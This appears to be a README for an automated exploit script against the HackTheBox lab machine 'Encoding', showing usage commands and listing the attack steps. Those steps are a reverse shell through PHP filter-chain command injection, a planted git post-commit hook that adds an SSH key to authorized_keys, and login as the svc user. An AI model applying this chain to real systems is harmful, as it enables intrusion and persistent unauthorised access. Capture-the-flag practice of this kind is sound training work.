# AutoPwn script for the `Encoding` HackTheBox machine.

## Usage

```bash
python3 encoding_autopwn.py -l <local_IP> -p <local_port>
python3 encoding_autopwn.py -lhost <local_IP> -lport <local_port>
```

Example:

```bash
python3 encoding_autopwn.py -l 10.10.14.29 -p 4444
```

## The script will:

- Create a reverse shell hitting and endpoint vulnerable to command injection through [PHP Filter chains](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
- Add a new `post-commit` hook to the `.git` folder to add a new .ssh key to the authorized_keys file
- Commit using the script that is inside the `Encoding` box as `svc` user
- Then we can login as `svc` user using the new ssh key through SSH
- Grab the user flag
